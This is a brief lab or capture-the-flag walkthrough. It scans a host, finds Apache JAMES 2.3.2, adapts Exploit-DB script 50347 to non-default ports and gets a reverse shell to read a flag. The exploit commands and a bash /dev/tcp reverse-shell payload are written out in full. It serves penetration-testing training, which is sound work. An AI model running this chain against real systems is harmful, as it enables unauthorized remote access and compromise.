nmap -sS -sC -sV -T4 -p22 192.168.172.52
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-18 09:46 PDT
Nmap scan report for 192.168.172.52
Host is up (0.0082s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   3072 67:2f:bf:fe:a6:61:4d:13:68:62:e4:ab:d3:c9:8e:50 (RSA)
|   256 7c:3c:8e:ea:64:48:2a:75:5b:86:c8:5d:d0:69:b1:fc (ECDSA)
|_  256 74:48:13:a7:a2:97:bf:93:cc:21:e4:8e:9e:ef:20:ce (ED25519)
32822/tcp open  james-admin JAMES Remote Admin 2.3.2
32823/tcp open  nntp        JAMES nntpd (posting ok)
32824/tcp open  pop3        JAMES pop3d 2.3.2
32825/tcp open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: 55ecac2f784c Hello nmap.scanme.org (192.168.45.219 [192.168.45.219])
32826/tcp open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:7a:b4:a3:82:d1:a0:15:fd:4d:0f:0b:b2:62:de:fb (RSA)
|   256 bc:c7:cf:1b:17:f6:eb:3b:3f:d1:3a:1f:d5:d4:bd:bf (ECDSA)
|_  256 4c:5a:7c:6f:e7:92:72:1d:3f:15:71:89:aa:7e:6e:a2 (ED25519)
Service Info: Host: 55ecac2f784c; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds

JAMES Remote Admin 2.3.2 is exploitable
https://www.exploit-db.com/exploits/50347

Based on the code we understand it will exploit using James Remote Admin 2.3.2 and JAMES smtpd 2.3.2.
searchsploit -m 50347
Then some modification required to perform on the default code,

code 50347.py
s.connect((remote_ip,4555)) # Need to change the default port to 32822
s.connect((remote_ip,25)) # Need to change the default port to 32825

nc -lvnp 6666
python3 50347.py <remote-ip> <attacker-ip> <attacker-port>
+]Payload Selected (see script for more options):  /bin/bash -i >& /dev/tcp/192.168.45.219/6666 0>&1
[+]Example netcat listener syntax to use after successful execution: nc -lvnp 6666
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).
[+]Don't forget to start a listener on port 6666 before logging in!

Payload required to execute through SSH login and student:lab is provided
Lets try to SSH 
ssh student@<remote-ip> -p 32826

connect to [192.168.45.219] from (UNKNOWN) [192.168.189.52] 38030
challenge@55ecac2f784c:~$ ls
ls
flag.txt
challenge@55ecac2f784c:~$ cat fl
cat flag.txt 
Congrats. Here is your flag, brought to you by the great Ronald Dahl:

OS{c27e0228106b2925d79eb1e283feade1}
challenge@55ecac2f784c:~$